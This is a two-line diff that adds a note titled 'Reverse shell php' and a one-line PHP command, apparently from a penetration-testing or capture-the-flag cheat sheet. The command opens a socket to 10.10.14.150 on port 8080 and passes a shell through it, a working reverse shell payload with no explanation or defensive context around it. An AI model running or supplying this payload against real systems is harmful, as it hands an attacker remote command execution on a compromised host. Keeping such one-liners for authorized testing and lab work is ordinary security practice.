@@ -1,0 +1,2 @@
+Reverse shell php 
+php -r '$sock=fsockopen("10.10.14.150",8080);passthru("sh <&3 >&3 2>&3");'
